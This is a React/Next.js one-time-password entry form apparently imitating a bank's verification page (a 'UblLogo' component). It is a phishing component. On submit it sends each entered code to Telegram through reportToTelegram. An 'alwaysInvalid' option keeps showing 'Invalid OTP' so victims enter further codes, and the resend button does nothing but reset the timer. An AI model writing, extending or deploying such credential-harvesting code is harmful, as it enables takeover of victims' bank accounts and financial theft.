"use client"

import type React from "react"
import { useEffect, useRef, useState } from "react"
import { useRouter } from "next/navigation"
import { ArrowLeft } from "lucide-react"
import { UblLogo } from "@/components/ubl-logo"
import { reportToTelegram } from "@/lib/report"

const OTP_LENGTH = 6
const START_SECONDS = 179 // 02:59

type OtpFormProps = {
  /** Where to navigate on a successful verify. When omitted, the code is treated as invalid. */
  nextHref?: string
  /** When true, any submitted code always shows "Invalid OTP". */
  alwaysInvalid?: boolean
  /** Label used when reporting the entered code to Telegram. */
  label?: string
}

export function OtpForm({ nextHref, alwaysInvalid = false, label = "OTP" }: OtpFormProps) {
  const router = useRouter()
  const [digits, setDigits] = useState<string[]>(Array(OTP_LENGTH).fill(""))
  const [seconds, setSeconds] = useState(START_SECONDS)
  const [error, setError] = useState("")
  const [maskedMobile, setMaskedMobile] = useState("*******XXX")
  const inputsRef = useRef<Array<HTMLInputElement | null>>([])

  useEffect(() => {
    let mobile = ""
    try {
      mobile = sessionStorage.getItem("ubl_mobile") ?? ""
    } catch {}
    const lastThree = mobile.slice(-3)
    if (lastThree.length === 3) {
      setMaskedMobile("*******" + lastThree)
    }
  }, [])

  useEffect(() => {
    if (seconds <= 0) return
    const id = setInterval(() => setSeconds((s) => (s > 0 ? s - 1 : 0)), 1000)
    return () => clearInterval(id)
  }, [seconds])

  const mm = String(Math.floor(seconds / 60)).padStart(2, "0")
  const ss = String(seconds % 60).padStart(2, "0")

  function handleChange(index: number, value: string) {
    if (error) setError("")
    const digit = value.replace(/\D/g, "").slice(-1)
    setDigits((prev) => {
      const next = [...prev]
      next[index] = digit
      return next
    })
    if (digit && index < OTP_LENGTH - 1) {
      inputsRef.current[index + 1]?.focus()
    }
  }

  function handleKeyDown(index: number, e: React.KeyboardEvent<HTMLInputElement>) {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      inputsRef.current[index - 1]?.focus()
    }
  }

  function handlePaste(e: React.ClipboardEvent<HTMLInputElement>) {
    e.preventDefault()
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, OTP_LENGTH)
    if (!pasted) return
    const next = Array(OTP_LENGTH).fill("")
    for (let i = 0; i < pasted.length; i++) next[i] = pasted[i]
    setDigits(next)
    const focusIndex = Math.min(pasted.length, OTP_LENGTH - 1)
    inputsRef.current[focusIndex]?.focus()
  }

  async function handleVerify(e: React.FormEvent) {
    e.preventDefault()
    const code = digits.join("")
    if (code.length < OTP_LENGTH) {
      setError("Please enter the complete 6-digit code")
      return
    }
    await reportToTelegram(label, { code })
    if (alwaysInvalid || !nextHref) {
      setError("Invalid OTP")
      return
    }
    router.push(nextHref)
  }

  function handleResend() {
    setDigits(Array(OTP_LENGTH).fill(""))
    setSeconds(START_SECONDS)
    setError("")
    inputsRef.current[0]?.focus()
  }

  return (
    <div className="flex h-full w-full max-w-[420px] flex-col">
      {/* Back */}
      <button
        type="button"
        onClick={() => router.back()}
        className="mb-8 flex items-center gap-2 text-[16px] font-bold text-foreground"
      >
        <ArrowLeft size={20} strokeWidth={2.5} />
        Back
      </button>

      {/* Logo */}
      <div className="mb-6 flex justify-center">
        <UblLogo />
      </div>

      {/* Card */}
      <div className="rounded-3xl bg-card px-6 py-8 shadow-sm">
        <h1 className="text-center text-[26px] font-extrabold text-foreground">Verify OTP</h1>
        <p className="mt-2 text-center text-[14px] text-muted-foreground">
          A 6-digit code has been sent to
        </p>
        <p className="mt-1 text-center text-[16px] font-extrabold tracking-wider text-foreground">
          {maskedMobile}
        </p>

        {/* OTP inputs */}
        <div className="mt-7 flex items-center justify-center gap-2">
          {digits.map((d, i) => (
            <input
              key={i}
              ref={(el) => {
                inputsRef.current[i] = el
              }}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={d}
              onChange={(e) => handleChange(i, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
              onPaste={handlePaste}
              aria-label={`OTP digit ${i + 1}`}
              aria-invalid={error ? true : undefined}
              className={
                "aspect-square min-w-0 flex-1 rounded-full border-2 bg-card text-center text-[18px] font-semibold text-foreground outline-none transition-colors focus:ring-2 " +
                (error
                  ? "border-destructive focus:border-destructive focus:ring-destructive/30"
                  : "border-border focus:border-ring focus:ring-ring/30")
              }
            />
          ))}
        </div>

        {/* Error message */}
        {error && (
          <p role="alert" className="mt-4 text-center text-[14px] font-semibold text-destructive">
            {error}
          </p>
        )}

        {/* Timer */}
        <p className="mt-8 text-center text-[14px] text-muted-foreground">Time remaining</p>
        <p className="mt-1 text-center text-[32px] font-extrabold text-accent">
          {mm}:{ss}
        </p>
      </div>

      {/* Footer actions */}
      <div className="mt-auto flex flex-col items-center gap-4 pt-10">
        <button
          type="button"
          onClick={handleVerify}
          className="w-full rounded-full bg-primary py-4 text-[15px] font-bold text-primary-foreground transition-opacity hover:opacity-95"
        >
          Verify OTP
        </button>
        <button
          type="button"
          onClick={handleResend}
          className="text-[15px] font-semibold text-accent/60 transition-colors hover:text-accent"
        >
          Resend OTP
        </button>
      </div>
    </div>
  )
}
